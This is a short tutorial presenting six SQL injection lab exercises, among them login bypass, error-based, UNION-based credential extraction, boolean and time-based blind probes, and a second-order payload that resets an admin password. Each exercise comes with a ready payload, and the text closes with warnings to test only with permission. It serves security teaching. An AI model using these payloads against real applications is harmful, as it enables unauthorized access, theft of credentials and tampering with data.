SQL injection is a common web application security vulnerability that occurs when an attacker is able to manipulate an application's SQL query by injecting malicious SQL code. Below are lab practicals to help you understand and experiment with SQL injection:

# Lab 1: Basic SQL Injection

### Steps:
- Identify a login form on a web application.
- Enter a valid username and inject SQL code into the password field (e.g., ' OR '1'='1'; --).
- Observe if the application logs you in without a correct password.

```
' OR '1'='1'; --
```

# Lab 2: Error-Based SQL Injection

### Steps:
- Identify a form that interacts with a database.
- Inject SQL code that intentionally causes an error (e.g., ' OR 1=CONVERT(int, (SELECT @@version)); --).
- Observe the error message returned by the application and extract information.
```
' OR 1=CONVERT(int, (SELECT @@version)); --
```

# Lab 3: Union-Based SQL Injection

### Steps:
- Identify a form that interacts with a database.
- Inject SQL code to perform a UNION-based attack (e.g., ' UNION SELECT username, password FROM users; --).
- Observe the combined results in the application's response.

```
' UNION SELECT username, password FROM users; --
```

# Lab 4: Blind SQL Injection (Boolean-Based)

### Steps:
- Identify a form that interacts with a database.
- Inject SQL code to perform a boolean-based attack (e.g., ' OR 1=1; -- and ' OR 1=2; --).
- Observe how the application's behavior changes based on the injected conditions.
```
' OR 1=1; --
' OR 1=2; --
```

# Lab 5: Time-Based Blind SQL Injection

### Steps:
- Identify a form that interacts with a database.
- Inject SQL code to perform a time-based blind attack (e.g., ' OR IF(1=1, SLEEP(5), 0); --).
- Observe if the application delays its response, indicating a successful injection.

```
' OR IF(1=1, SLEEP(5), 0); --
```

# Lab 6: Second-Order SQL Injection

### Steps:
- Identify an application that stores user input in a database without proper validation.
- Inject SQL code into user input and observe its effect when retrieved later in the application.

```
-- Assume the application stores the input in a database and retrieves it later
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

These payloads are intended to be injected into input fields, such as username or password fields in login forms. Note that the actual injection may vary depending on the specific context of the vulnerable web application.

Remember to use these commands responsibly, and only on systems where you have explicit permission to perform security testing. Unauthorized attempts to exploit vulnerabilities can have legal consequences.
> ## Note:
> * Always ensure that you have proper authorization before attempting any SQL injection experiments.
> * Use a controlled environment and never target systems or applications without permission.
> * Familiarize yourself with various SQL injection techniques and practice responsible disclosure when reporting vulnerabilities.*
